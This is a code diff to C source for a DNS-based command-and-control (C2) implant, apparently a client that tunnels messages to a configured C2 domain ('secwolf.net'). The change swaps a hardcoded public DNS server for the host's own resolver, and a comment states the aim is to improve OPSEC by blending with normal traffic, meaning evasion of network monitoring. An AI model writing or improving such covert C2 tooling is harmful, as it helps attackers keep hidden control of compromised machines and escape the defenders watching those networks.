@@ -67,9 +67,9 @@
 #endif
 
 // Configuration - these should match your server setup
-#ifndef DNS_SERVER
-    #define DNS_SERVER "8.8.8.8"  // Default if not set by build system
-#endif
+// DNS_SERVER macro removed - now uses get_system_dns() which reads
+// system resolver configuration (/etc/resolv.conf on Linux)
+// Falls back to 8.8.8.8 only when system resolver unavailable
 #define DNS_PORT 53
 #ifndef C2_DOMAINS
     #define C2_DOMAINS "secwolf.net"  // Comma-separated domains, default if not set by build system
@@ -670,18 +670,27 @@ static int skip_domain_name(const unsigned char *buffer, size_t buffer_len, size
 /*
  * Get system's default DNS server
  */
+/*
+ * Get system DNS resolver
+ * Priority: 1) System resolver (/etc/resolv.conf on Linux)
+ *           2) Fallback to 8.8.8.8 if unavailable
+ * 
+ * Using system DNS by default improves OPSEC (blends with normal traffic)
+ * Fallback to public DNS only when system resolver cannot be determined
+ */
 static int get_system_dns(char *dns_server, size_t dns_server_size) {
 #ifdef _WIN32
-    // On Windows, we'll use a fallback since reading registry is complex
+    // On Windows, reading registry is complex and platform-dependent
     // Most Windows systems can resolve through localhost or use DHCP DNS
+    // Fallback to public DNS if system resolver unavailable
     strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
     dns_server[dns_server_size - 1] = '\0';
     return 0;
 #else
-    // On Linux, read /etc/resolv.conf
+    // On Linux/Unix, read /etc/resolv.conf to get system resolver
     FILE *resolv = fopen("/etc/resolv.conf", "r");
     if (!resolv) {
-        // Fallback to common public DNS
+        // System resolver unavailable - use public DNS fallback
         strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
         dns_server[dns_server_size - 1] = '\0';
         return 0;
@@ -709,7 +718,7 @@ static int get_system_dns(char *dns_server, size_t dns_server_size) {
     
     fclose(resolv);
     
-    // No nameserver found, use fallback
+    // No nameserver found in resolv.conf - use public DNS fallback
     strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
     dns_server[dns_server_size - 1] = '\0';
     return 0;
@@ -1045,7 +1054,7 @@ static int send_dns_message(const char *message, const char *target_domain, char
             DEBUG_PRINT("[!] ERROR: All %d DNS query attempts failed for domain: %s\n", 
                        MAX_RETRIES, target_domain);
             DEBUG_PRINT("[!] Possible causes:\n");
-            DEBUG_PRINT("[!]   - DNS server unreachable (%s:%d)\n", DNS_SERVER, DNS_PORT);
+            DEBUG_PRINT("[!]   - DNS server unreachable (port %d)\n", DNS_PORT);
             DEBUG_PRINT("[!]   - C2 domain not responding: %s\n", target_domain);
             DEBUG_PRINT("[!]   - Network filtering/firewall blocking DNS\n");
             DEBUG_PRINT("[!]   - Server-side issue (check server logs)\n");
